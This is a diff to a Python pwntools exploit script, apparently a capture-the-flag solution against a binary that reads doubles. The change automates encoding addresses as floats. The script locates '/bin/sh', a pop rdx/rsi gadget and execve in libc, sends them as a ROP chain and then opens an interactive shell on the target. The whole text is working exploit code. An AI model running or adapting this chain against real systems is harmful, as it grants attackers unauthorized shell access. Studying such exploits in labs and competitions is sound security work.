@@ -31,7 +31,7 @@ def f2l(f):
     return l
 
 def l2f(l):
-    f = unpack('d', pack('Q', l))[0]
+    f = '%.100e' % unpack('d', pack('Q', l))[0]
     return f
 
 code = ELF(BINARY)
@@ -64,20 +64,17 @@ r.sendline(str(l2f(0x4009c3)))
 
 sh = libc.search('/bin/sh\x00').next()
 log.info('%#x', sh)
-sh_f = raw_input('sh:').strip()
-r.sendline(sh_f)
+r.sendline(str(l2f(sh)))
 
 pop_rdx_rsi = libc.address + 0x1306D9
 log.info('%#x', pop_rdx_rsi)
-pop_rdx_rsi_f = raw_input('pop: ').strip()
-r.sendline(pop_rdx_rsi_f)
+r.sendline(str(l2f(pop_rdx_rsi)))
 
 r.sendline('0')
 r.sendline('0')
 
 execve = libc.sym['execve']
 log.info('%#x', execve)
-execve_f = raw_input('execve: ').strip()
-r.sendline(execve_f)
+r.sendline(str(l2f(execve)))
 
 r.interactive()
